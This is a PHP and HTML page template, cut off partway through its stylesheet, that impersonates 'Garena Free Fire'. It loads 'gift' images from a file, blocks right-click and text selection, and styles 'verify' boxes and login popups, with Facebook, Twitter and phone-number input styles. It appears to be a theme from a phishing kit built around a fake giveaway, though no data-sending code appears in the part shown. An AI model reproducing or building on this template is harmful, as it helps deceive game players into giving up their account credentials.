<?php
$imageLinksFile = "GiaoDien/VanTan.txt";

if (file_exists($imageLinksFile)) {
    $imageLinksContent = file_get_contents($imageLinksFile);

    $imageLinks = json_decode($imageLinksContent);

    if (is_array($imageLinks) && count($imageLinks) >= 7) {
        $bannerLink = explode('|', $imageLinks[0])[0];
		$bannerName = explode('|', $imageLinks[0])[1];
        $gift1Link = explode('|', $imageLinks[1])[0];
        $gift1Name = explode('|', $imageLinks[1])[1];
        $gift2Link = explode('|', $imageLinks[2])[0];
        $gift2Name = explode('|', $imageLinks[2])[1];
        $gift3Link = explode('|', $imageLinks[3])[0];
        $gift3Name = explode('|', $imageLinks[3])[1];
        $gift4Link = explode('|', $imageLinks[4])[0];
        $gift4Name = explode('|', $imageLinks[4])[1];
        $gift5Link = explode('|', $imageLinks[5])[0];
        $gift5Name = explode('|', $imageLinks[5])[1];
        $gift6Link = explode('|', $imageLinks[6])[0];
        $gift6Name = explode('|', $imageLinks[6])[1];
		$gift7Link = explode('|', $imageLinks[7])[0];
        $gift7Name = explode('|', $imageLinks[7])[1];
		$gift8Link = explode('|', $imageLinks[8])[0];
        $gift8Name = explode('|', $imageLinks[8])[1];
		$gift9Link = explode('|', $imageLinks[9])[0];
        $gift9Name = explode('|', $imageLinks[9])[1];
    } else {
        echo "";
    }
} else {
    echo "";
}
?>
<base href="GiaoDien/theme19/">

<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Garena Free Fire</title>
<meta property="og:description" content="Garena Free Fire">
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuOPOCW0_odiVaBwlCfpH-b2XaHpZSsJKYM1WGJ6dGqNu95wrnSpW4UZ5oePny4ulr-vuR">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link rel="icon" type="img/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuOPOCW0_odiVaBwlCfpH-b2XaHpZSsJKYM1WGJ6dGqNu95wrnSpW4UZ5oePny4ulr-vuR" sizes="32x32">
<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
<link rel="stylesheet" href="css/style1.css">
<link rel="stylesheet" href="css/loader.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/facebook.css">
<link rel="stylesheet" href="css/twitter.css">
<link rel="stylesheet" href="css/international-telephone-input.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
    -webkit-box-sizing:border-box;
    -moz-box-sizing:border-box;
    box-sizing:border-box;
}
@font-face {
    font-family: 'selow'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/selow.woff2) format("woff2"), 
        url(fonts/selow.woff) format("woff"),
        url(fonts/selow.ttf) format("truetype");
}
@font-face {
    font-family: 'empirez'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/Empirez.ttf) format("truetype");
}
body {
    background: #000;
    margin: 0;
    font-family: 'Teko', 'selow';
}
.container {
    background: url('img/bg-sec1.jpg') no-repeat center;background-size: cover; 
    background-size: cover;
    position: relative;
    margin: 0px auto;
    max-width: 400px;
    height: auto;
    border: 1px solid #fff;
}
.sec-container {    
   background: url('img/bg-sec1.jpg') no-repeat center;background-size: cover;  
   margin-top: 0px;
   padding: 5px;
   width:100%;
   height: 590.5px;
   border-left: 0px solid #fff;
   border-right: 0px solid #fff;
   border-top: 1px solid #fff;
   border-bottom: 1px solid #fff;
}   
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.sec-container {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #DD3183, yellow, #DD3183) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.sec-verify-container { 
   background: url('img/bg-sec.png') no-repeat center;background-size: cover;   
   margin-top: -17px;
   padding: 5px;
   width:100%;
   height: 495px;
   border-left: 0px solid #fff;
   border-right: 0px solid #fff;
   border-top: 0px solid #fff;
   border-bottom: 0px solid #fff;
}
.sec-footer {   
   margin-top: -10px;   
   width:100%;
   display: block;     
}
.sec-notify {   
   margin-top: -5px;
   margin-bottom: 5px;
   padding: 5px;
   width:100%; 
   display: block;  
}
.navbar {
    background: #0C0C0C;
    width: 100%;
    height: 65px;
}
.navbar-logo {
    width: 40px;
    float: left;
    margin-top: 11px;
    margin-left: 11px;
}
.navbar-shop {
    width: 25px;
    margin-top: 19px;
    margin-right: 20px;
}
.navbar-language {
    width: 25px;
    margin-top: 19px;
    margin-right: 20px;
}
.navbar-menu {
    width: 20px;
    margin-top: 19px;
    margin-right: 5px;
}
.navbar-right {
    width: auto;
    float: right;
}
.navbar-download {
    background: #ffca13;
    width: 46px;
    height: 45px;
    margin-top: 10px;
    margin-right: 10px;
    border-radius: 7px;
    float: right;
}
.navbar-download img {
    width: 20px;
    height: 21px;
    margin: 13px;
}
.header {
    width: 100%;
    height: auto;
    margin-bottom: 0px;
}
.header img {
    width: 100%;
    height: auto;
    margin-top: -0px;
    border-bottom:0px solid #C3A4FE;
}
.sec-event-title {
    width: 100%;
    height: auto;
    margin-bottom: 15px;
}
.sec-event-title img {
    width: 100%;
    height: auto;
    margin-top: -0px;
    border-bottom:0px solid #C3A4FE;
}
.headersec {
    width: 97%;
    height: auto;   
    margin-bottom: 15px;
    margin-left: auto;
    margin-right: auto; 
}
.headersec img {
    width: 100%;    
    height: auto;
    margin-top: 11px;   
    border-radius: 10px;
    border:1px solid #C3A4FE;   
}
.headerfoot {
    width: 95%;
    height: auto;       
    margin-top: -20px;
    margin-left: auto;  
    margin-right: auto; 
}
.headerfoot img {
    width: 100%;
    height: auto;
    margin-top: -0px;   
    border-radius: 5px;
    border:1px solid #B22AE8;
}
.header video {
    width: 100%;
    height: auto;
    margin-top: -0px;
}
.event-title {
    background:url(img/title-sec.png) no-repeat center center;
    background-size:100% 100%;
    width:92%;
    height: 70px;
    margin-top: 2px;
    margin-bottom:1px;
    margin-right: auto;
    margin-left: auto;  
    display:block;
}
.event-notification {
    background: url(img/alert-selow.png) no-repeat center;
    background-size: 100% 100%;
    width:98%;
    height:55px;
    padding:7px;
    margin-top:3px;
    margin-bottom:7px;
    margin-right: auto;
    margin-left: auto;
}
.event-notification-text {
    padding-top:10px;
    text-align:center;
    font-family:selow;
    color:#2AAFF4;
    font-size:17px;
}
.alert-wrapper {
  width:98%;
  height:auto;
  border: none;
  display:block;
  margin:10px auto;  
  margin-top: -20px;  
}
.alert {
  background:url(img/notify-sec.png) no-repeat center;
  background-size:100% 100%;
  width:98%;
  height:50px;
  margin-top: 25px;
  margin-bottom: -1px;
  padding:7px;
  margin-left: auto;
  margin-right: auto; 
  color:#fff;  
  border:none;
}
.alert-text1 {
  margin-top: 1px;
  margin-left: 5px;
  padding:7px;
  color:#000;
  text-align:left;
  font-size:16px;
  font-family:selow;
  border:none;
}
.alert-text-mid {
  margin-top: 1px;  
  padding:7px;
  color:#000;
  text-align:center;
  font:25px;
  font-family:selow;
  border:none;
}
.alert-time {
  width:20%;
  height:auto;
  color:#000;
  text-align:center;  
  margin-top: 6px;
  margin-right: 10px; 
  padding:2px;
  border:2px solid #000;
  border-radius:0px;
  float: right;
  font-size: 13px;
  font-family:selow;
}
.box {
    background: url(img/boxsec.png) no-repeat center;
    background-size: 100% 100%;
    width: 100%;    
    height: 430px;      
    display: block;
}
.sec-box-item {
    width: 27%;
    float:left;
    height: 100px;
    margin-right:-22px;                 
    display: inline-block;  
}
.sec-box-item2 {
    width: 27%;
    float:left;
    margin-top:45px;
    height: 100px;                  
    display: block; 
}
.scroll {
    overflow:scroll;
    position:relative;
    width: 100%;
    height:auto;
    padding-top:20px;
    margin-left: auto;
    margin-right: auto;
    display: block;
    scrollbar-face-color:#ffbb40;
    scrollbar-shadow-color:#ffbb40;
    scrollbar-highlight-color:#ffbb40;
    scrollbar-3dlight-color:#ffbb40;
    scrollbar-darkshadow-color:#ffbb40;
    scrollbar-track-color:#ffbb40;
    scrollbar-arrow-color:#ffbb40;
}
.verify-box-navbar {    
    background-size: 100% 100%;
    width: 93%;
    height: 19%;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.verify-box-navbar-description {
    width: 50%;
    margin-top: 50px;
    margin-right: 20px;
    color: #fff;
    font-size: 18px;
    font-family: Teko;
    font-weight: 500;
    text-align: left;
    float: right;
}
.verify-box-navbar-form {   
    background-size: 100% 100%;
    width: 93%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.verify-box-navbar-form input {
    background:url(img/verify-bg.jpg) no-repeat center center;
    background-size: 100% 100%;
    width: 95%;
    height: 40px;
    margin-left: 10px;
    margin-bottom: 4px;
    padding: 4px;
    padding-left: 10px;
    padding-right: auto;
    color: #fff;
    font-size:15px;
    font-family: selow;
    font-weight: 500;
    border: 1px solid #fff;
    position: relative;
    outline: none;
    -webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-navbar-form input::placeholder {
    color: #fff;
}
.verify-box-navbar-form select {
    background:url(img/verify-bg.jpg) no-repeat center center;
    background-size: 100% 100%;
    width: 95%;
    height: 40px;
    margin-left: 10px;
    margin-bottom: 4px;
    padding: 4px;
    padding-left: 10px;
    padding-right: auto;
    color: #fff;
    font-size:15px;
    font-family: selow;
    font-weight: 500;
    border: 1px solid #fff;
    position: relative;
    outline: none;
    -webkit-appearance: none;
    -moz-appearance: none;
}
.verify-box-content {   
    background-size: 100% 100%;
    width: 93%;
    height: auto;
    margin-top: -1px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 15px;
    padding: 20px;
    padding-top: 0px;
    padding-bottom: 25px;
    display: block;
}
.verify-box-content-title {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 6px;
    color: #fff;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    display: block;
}
.verify-box-content-title i {
    padding-top: 15px;
    padding-bottom: 15px;
    color: #fff;
    font-size: 100px;
    text-align: center;
}
.verify-box-content button {
    background:url(img/button-on.png) no-repeat center center;
    background-size:100% 100%;
    width: 50%;
    height: 50px;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 7px;
    padding-top: 8px;
    padding-left: 21px;
    padding-right: 20px;
    color: #000;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    border: none;   
    display: block;
}
.about-box-content {    
    background:url(img/aboutrules-sec.png) no-repeat center center;
    background-size:100% 100%;
    width: 98%;
    height: 120px;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 20px;
    padding-top: 0px;
    padding-bottom: 25px;
    color: #000;
    display: block;
}
.about-box-content-title {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 6px;
    color: #000;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    display: block;
}
.about-box-content-title i {
    padding-top: 15px;
    padding-bottom: 15px;
    color: #000;
    font-size: 100px;
    text-align: center;
}
.about-box-content button {
    background:url(img/menu-on.png) no-repeat center center;
    background-size:100% 100%;
    width: 50%;
    height: 45px;   
    padding: 7px;
    margin-bottom: 20px;    
    margin-top: 20px;
    padding-left: 20px;
    padding-right: 20px;
    color: #000;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    border: none;   
    display: block;
}
.btn-wrapper {
    width: 100%;
    height: 50px;   
    margin-top: 3px;                
    font-family:selow;  
}
.btn-wrapper button {
    background: url(img/button.png) no-repeat center;
    background-size: 100% 100%;
    width: 40%;
    height: 43px;
    margin-top: 45px;
    margin-left: -10px; 
    margin-right: 6px;  
    padding: 5px;   
    color: #AAAAAA;
    font-family:selow;
    font-size: 16px;    
    font-weight: 400;
    text-align: center; 
    border: none;
    outline: none;
    float:left;
    display: inline-block;  
}
.processing-box-sec {   
    background: url(img/box-sec.png) no-repeat center;
    background-size: 100% 100%;
    width: 98%;
    height: 350px;
    margin-left: auto;
    margin-right: auto;
    margin-top: 10px;
    margin-bottom: 15px;
    padding: 20px;
    padding-top: 10px;  
    padding-bottom: 2px;
    display: block;
}
.processing-box-sec-title {
    width: 95%;
    height: auto;
    margin-top: 5px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 20px;
    padding: 5px;
    padding-left: 10px;
    color: #fff;
    font-size: 15px;
    font-family:selow;  
    text-align: left;
    display: block;
}
.menu-wrapper-border {
    height: 11px;
}
.menu-wrapper {
    width: 94.3%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 12px;
    display: block;
}
.menu-content {
    background:url(img/btn-off.png) no-repeat center center;
    background-size:100% 100%;
    width: 32%;
    height: auto;
    padding: 6px;
    color: #003a75;
    font-size: 17px;
    font-family:'Teko', sans-serif;
    font-weight: 500;
    text-align: center;
    text-shadow: 0 0 1px #fff38a,0 0 1px #fff38a;
    border: none;
    cursor: pointer;
    -webkit-text-stroke:0 transparent;
}
.menu-content-active {
    background:url(img/btn-on.png) no-repeat center center;
    background-size:100% 100%;
    color: #7f2c10;
}
.item4 {
    background-size:display;
    width: 42%;
    height: 77px;
    margin: 5px;
    margin-top: 1px;    
    margin-bottom: 1px;
    display: inline-block;
    border: 2px solid #000;
    border-radius: 0px; 
}
.item4 img {
    background-size:display;
    width: 100%;
    height: 100%; 
    border:none;       
    border-radius: 0px;
}
.item3 {
    background-size:display;
    width: 28%;
    height: 100px;
    margin: 5px;
    margin-top: 2px;    
    margin-bottom: 5px;
    display: inline-block;
    border: 2px solid #000;
    border-radius: 0px; 
}
.item3 img {
    background-size:display;
    width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}
.itembutton {
    background:url(img/yes_selow.png) no-repeat center center;
    background-size:display;
    width: 29%;
    height: 36px;
    padding:5px;    
    margin-top: -20px;
    padding-top: 6px;
    margin-left: auto;
    margin-right: auto;
    padding-left: auto;
    padding-right: auto;    
    text-align: center;     
    margin-bottom: 1px;
    font-family: empirez;
    font-size: 18px;
    color: #000;
    border:1px solid #fff;
    text-shadow: 1px solid #fff;
    display: block; 
}
@keyframes bounce {
  to { transform: scale(1.1); }
}   
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.itembutton {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #DD3183, yellow, #DD3183) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.itembutton img {
    background-size:display;
    width: 100%;
    height: 100%; 
}
.item5 {
    background-size:display;
    width: 100%;
    height: 77px;
    margin: 5px;
    margin-top: 1px;    
    margin-bottom: 1px;
    display: block;
    border: 2px solid #000;
    border-radius: 0px; 
}
.item5 img {
    background-size:display;
    width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}
.item2 {
    background-size:display;
    width: 22%;
    height: 77px;
    margin: 2px;    
    margin-top: 1px;
    margin-bottom: -5px;
    display: inline-block;
    border: 2px solid #000;
    border-radius: 0px; 
}
.item2 img {
    background-size:display;
    width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 0px;
}        
.item7 {    
    background-size:display;
    width: 67px;
    height: 67px;
    display: block;
    padding: 5px;
    margin-left: auto;
    margin-right: auto;
}
.item7 .item-nominal {  
    color: #fff;
    font-size: 13px;
    font-family: selow;
    text-align: right;
    position: absolute;
    padding-top: 50px;
    padding-left: 10px;
}    
.item7 img {
    width: 100%;
    height: 100%; 
    margin-top: 17px;      
    margin-left: 3px; 
    -webkit-filter: drop-shadow(1.5px 1px 0 #DD3183)
    drop-shadow(-1px 1px 0 #DD3183);
    filter: drop-shadow(1.5px 1px 0 #DD3183) 
    drop-shadow(-1px 1px 0 #DD3183);
}    
.border-item {
    -webkit-filter: drop-shadow(1.5px 1px 0 #DD3183)
    drop-shadow(-1px 1px 0 #DD3183);
    filter: drop-shadow(1.5px 1px 0 #DD3183) 
    drop-shadow(-1px 1px 0 #DD3183);
}    
.border-item-stop {
    -webkit-filter: drop-shadow(1.5px 1px 0 #DD3183)
    drop-shadow(-1px 1px 0 #DD3183);
    filter: drop-shadow(1.5px 1px 0 #DD3183) 
    drop-shadow(-1px 1px 0 #DD3183);
} 
.box-shadow {
    --stroke-pos: 1px;
    --stroke-neg: -1px;
    --stroke-color: rgba(255, 215, 0, 0.2);
    filter: drop-shadow(var(--stroke-pos) 0 0 var(--stroke-color)) 
      drop-shadow(var(--stroke-neg) 0 var(--stroke-color))
      drop-shadow(0 var(--stroke-pos) 0 var(--stroke-color))
      drop-shadow(0 var(--stroke-neg) 0 var(--stroke-color))
      drop-shadow(var(--stroke-pos) var(--stroke-pos) 0 var(--stroke-color)) 
      drop-shadow(var(--stroke-pos) var(--stroke-neg) 0 var(--stroke-color))
      drop-shadow(var(--stroke-neg) var(--stroke-pos) 0 var(--stroke-color))
      drop-shadow(var(--stroke-neg) var(--stroke-neg) 0 var(--stroke-color));   
}              
.item6 {
    background-size:display;
    width: 69px;
    height: 69px;
    display: block; 
    padding: 3px;   
}   
.item6 img {
    width: 100%;
    height: 100%; 
    -webkit-filter: drop-shadow(1.5px 1px 0 #FEFABB)
    drop-shadow(-1px 1px 0 #FEFABB);
    filter: drop-shadow(1.5px 1px 0 #FEFABB) 
    drop-shadow(-1px 1px 0 #FEFABB);
}
.Kinnon-box {
    background:url(img/hexbox.png) no-repeat center center;
    background-size:100% 100%;
    width: 100%;
    height: 100%;
    margin-bottom:-10px;          
}
.box-selector {
    background:url(img/box-selector.png) no-repeat center center;
    background-size:100% 100%;
    width: 100%;
    height: 100%;   
    padding: 3px;   
}
.event-notify { 
    width: 27%;
    height: 30px;
    font-size: 14px;
    padding:5px;
    margin-right:5px;
    font-family:empirez;
    text-align: center;
    color: #CBB2CF;
    border: 1px solid #fff;
    display: inline-block;      
}
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.event-notify {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #DD3183, yellow, #DD3183) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.event-notify-text {    
    font-size: 14px;
    font-family:empirez;
    text-align: center;
    color: #CBB2CF;
    display: block; 
    position: relative;      
    background: linear-gradient(90deg, #CBB2CF, #fff, #CBB2CF);
    background-repeat: repeat;
    background-size: 90%;
    animation: animate 3s infinite;
    -webkit-background-clip: text;
    -webkit-text-fill-color: rgba(0, 0, 0, 0);
}
@keyframes animate {
  0% {
    background-position: -500%;
  }
  100% {
    background-position: 500%;
  }
}
.alert-text {        
    width: 65%;
    height: 30px;
    padding:5px;
    color: #fdf6bf;
    text-align: center;
    font-size: 14px;    
    font-family: selow;
    border: 1px solid #fff;
    display: inline-block;      
}
.alert-text i {              
    color: #fdf6bf;
    text-align: left;
    font-size: 13px; 
}               
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.alert-text {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #DD3183, yellow, #DD3183) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.footer {
    background: #19191b url(https://i.postimg.cc/02KwtTc7/footer-bg.jpg) top center / 100% no-repeat;
    background-position-y: calc(20 / 640 * 100vw);  
    width: 100%;
    height: auto;
    padding: 15px;
    border-left: 0px solid #fff;
    border-right: 0px solid #fff;
    border-bottom: 0px solid #fff;
    border-top:0px solid #C3A4FE;
}
.footer-txt-join {
    margin-top: 10px;
    margin-bottom: 15px;
    color: #ffbe21;
    font-size: 30px;
    font-family:selow;
    text-align: left;
    text-transform: uppercase;
}
.footer-txt-twitter {
    margin-top: -3px;
    margin-bottom: -10px;
    color: #ffbe21;
    font-size: 25px;
    font-family:teko;
    text-align: center;
}
.footer-socmed-box {
    background: url(https://www.pubgmobile.com/en/images/footer_link_bg.png) no-repeat center center;
    background-size: 100% 100%;
    width: 100%;
    height: 55px;
    margin-bottom: 10px;
    padding: 5px;
    border-radius: 3px;
}
.footer-socmed-box:hover {
    background: url(https://www.pubgmobile.com/en/images/footer_link_bg_on.png) no-repeat center center;
    background-size: 100% 100%;
    transition: 1s;
}
.footer-socmed-img-main {
    width: 30px;
    height: 30px;
    margin-top: 7px;
    margin-left: 15px;
    margin-right: 15px;
    float: left;
}
.footer-socmed-img-other {
    width: 35px;
    height: 26px;
    margin-top: 10px;
    margin-left: 15px;
    margin-right: 11px;
    float: left;
}
.footer-socmed-box p {
    margin-top: 7px;
    color: #fff;
    font-size: 25px;
    font-family: Teko;
    text-align: left;
    text-transform: uppercase;
}
.footer-socmed-box button {
    background: #ffbe21;
    width: 30%;
    height: auto;
    margin-top: 10px;
    margin-bottom: 10px;
    margin-right: 15px;
    padding: 1px;
    padding-top: 3px;
    color: #000;
    font-size: 16px;
    font-family:Teko;
    text-align: center;
    text-transform: uppercase;
    border: none;
    border-radius: 2px;
    outline: none;
    float: right;
}
.footer-copyright-icon {
    width: 85%;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.footer-txt-copyright {
    color: #bdbdbd;
    font-size: 15px;
    font-family:Teko;
    text-align: center;
}
.footer-txt-copyrights {
    color: #bdbdbd;
    font-size: 16px;
    font-family:Teko;
    text-align: center;
}
.loadkin {
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0; 
    z-index:9999;
    background:#000;
}
.loadkin-box {
    position: relative;
    margin: 50px auto;
    text-align: center;
    height: 43px;
    font-size: 20px;
    padding: 5px;
    padding-bottom: 5px;
    margin-top: 70%;  
}
.loadkin-box img {
    width:70px;
    height:85px;
    margin-bottom:10px;
}
.loadkin-box i {
    padding-top: 15px;
    padding-bottom: 15px;
    color: #fff;
    font-size: 20px;
    float:center;
    font-family: arial, sans-serif;
    text-align: center;
}
.popup {
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index:9999;
    background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrapper {
    width: 390px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 15%;
    text-align: center;
    font-family:'selow';
    color:#fff;
}
.popup-box-navbar {
    background:url(img/popup-navbar-sec.png) no-repeat center center;
    background-size:100% 100%;
    height: 43px;
    padding-bottom: 0px;    
}
.popup-box-navbar img {
    width: 25px;
    height: 25px;
    margin-top: 7px;
    margin-right: 15px;
    float: right;
}
.popup-box-navbar-title {   
    padding-top: 10px;
    padding-bottom: 2px;
    font-size: 19px;
    font-family:selow;
    font-weight: 300;
    margin-left: 17px;  
    text-align: left;
    color: #fff;
}
.popup-box-bg {
    background:url(img/popup-box-bg-sec.png) no-repeat center center;
    background-size:100% 100%;
    width: 100%;
    margin-top: -1px;
    border-top:1px solid #fff;
}   
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-bg {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #DD3183, yellow, #DD3183) 1;
  animation: 1s rotate linear infinite;
}
@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.popup-box-alert {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #AAAAAA;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: left;
    display: block;
}
.popup-box-alert2 {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #AAAAAA;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: left;
    display: block;
}
.popup-box-alert0 {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #AAAAAA;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: right;
    display: block;
}
.popup-box-alert3 {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #AAAAAA;
    font-size: 16px;
    font-family:selow;
    font-weight: 500;
    text-align: left;
    display: block;
}
.popup-box-alert7 {
    width: 95%;
    height: auto;
    margin-top: 10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 5px;
    color: #F5EAB0;
    font-size: 18px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    display: block;
}
.popup-box-alert4 {
    width: 95%;
    height: auto;
    margin-top: -10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 6px;
    color: #AAAAAA;
    font-size: 17px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    display: block;
}
.popup-box-alert4 i {
    padding-top: 15px;
    padding-bottom: 15px;
    color: #AAAAAA;
    font-size: 50px;
    text-align: center;
}
.popup-box-sub {
    width: 95%;
    height: auto;
    margin-top: -10px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 10px;
    padding: 6px;
    color: #AAAAAA;
    font-size: 16px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    display: block;
}
.popup-box-loading {
    width: 95%;
    height: auto;
    margin-top: 20px;
    margin-left: auto;
    margin-right: auto;
    margin-bottom: 20px;
    padding: 6px;
    color: #AAAAAA;
    font-size: 17px;
    font-family:selow;
    font-weight: 500;
    text-align: center;
    display: block;
}
.popup-box-loading img {
    width: 45px;
    height: auto;
    margin-bottom: 20px;
    text-align: center;
    animation-name: spin;
    animation-duration: 400ms;
    animation-iteration-count: infinite;
    animation-timing-function: linear;
}
@keyframes spin {
    from {transform:rotate(0deg);}
    to {transform:rotate(360deg);}
}
.alter-text {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: 10px;
    margin-bottom: 10px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 90%;
}
.alter-text>span {
    display: inline-block;
    position: relative;
    color: #E3C86D;
    cursor: default;
    font-size: 12px;
    text-shadow: none;
}
.alter-text>span:before,
.alter-text>span:after {
    background: #E3C86D;
    border-bottom: 1px solid #E3C86D;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.alter-text>span:before {
    margin-right: 15px;
    right: 100%;
}
.alter-text>span:after {
    left: 100%;
    margin-left: 15px;
}
.popup-box-item {
    width:23%;
    height:85px;
    margin-left:auto;
    margin-right:auto;
    text-align: right;
    border:1px solid #fff;
    display: block;
}
@property --angle {
  syntax: '<angle>';
  initial-value: 0deg;
  inherits: false;
}
.popup-box-item {
  --angle: 360deg;
  border-image: linear-gradient(var(--angle), #66000000, red, yellow, red, #66000000) 1;
  animation: 1s rotate linear infinite;
}

@keyframes rotate {
  to {
    --angle: 0deg;
  }
}
.popup-box-item img {
    width:100%;
    height:100%;
}
.popup-box-item span {
    color: #fff;
    font-size: 22px;
    font-family: selow;
    text-align: right;
    position: absolute;
    left: 0;
    right: 2px;
    bottom: -5px;
}
.popup-box-gamecon {
    width: 52%;
    height: 65px;
    margin-left: auto;
    margin-right: auto;
    margin-top: 10px;
    display: block;
}
.popup-box-form {
    width: 85%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    display: block;
}
.popup-box-form label {
  display: inline-block;
  width: 140px;
  text-align: right;
  color: yellow;
}
.popup-box-form input {
    background: #4A4A4A;
    background-size: 100% 100%;
    width: 100%;
    height: 35px;
    margin-bottom: 3px;
    padding: 4px;
    padding-left: 10px;
    color: #FFFBF7;
    font-size:16px;
    font-family:selow;
    font-weight: 300;
    border: 1px solid #AAAAAA;
    position: relative;
    outline: none;
    -webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-form input::placeholder {
    color: #FFFBF7;
}
.popup-box-form select {
    background: #4A4A4A;
    background-size: 100% 100%;
    width: 100%;
    height: 35px;
    margin-bottom: 3px;
    padding: 4px;
    padding-left: 10px;
    color: #FFFBF7;
    font-size:16px;
    font-family:selow;
    font-weight: 300;
    border: 1px solid #AAAAAA;
    position: relative;
    outline: none;
    -webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-footer { 
    background-size:100% 100%;
    margin-top: 20px;
    width: 100%;
    height: 45px;
}
.popup-box-footer button {
    background: url(img/button.png) no-repeat center;
    background-size: 100% 100%;
    width: auto;
    height: auto;
    margin-top: -2px;
    padding: 5px;
    padding-left: 35px;
    padding-right: 35px;
    color: #000;
    font-size:17px;
    font-family: selow;
    font-weight: 500;
    text-align: center;
    border: none;
    outline: none;
}
.popup-box-footero {    
    background-size:100% 100%;
    margin-top: 20px;
    width: 100%;
    height: 45px;
}
.popup-box-footero button {
    background: url(img/button.png) no-repeat center;
    background-size: 100% 100%;
    width: 30%;
    height: auto;
    margin-top: -2px;
    padding: 5px;
    padding-left: 35px;
    padding-right: 35px;
    color: #000;
    font-size:17px;
    font-family: selow;
    font-weight: 500;
    text-align: center;
    border: none;
    outline: none;
}
.popup-box-form-footer {    
    background-size:100% 100%;
    margin-top: 20px;
